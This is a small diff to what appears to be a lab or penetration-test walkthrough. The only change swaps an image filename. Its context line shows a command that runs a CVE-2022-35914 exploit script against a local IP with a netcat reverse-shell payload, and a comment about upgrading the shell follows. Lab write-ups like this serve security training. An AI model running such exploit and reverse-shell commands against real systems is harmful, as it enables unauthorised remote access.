@@ -68,7 +68,7 @@ python3 CVE-2022-35914.py -u http://192.168.228.190 -c 'nc -e /bin/sh 192.168.45
 
 <figure><img src="../.gitbook/assets/13.png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/14.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/14 (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 # 升级shell
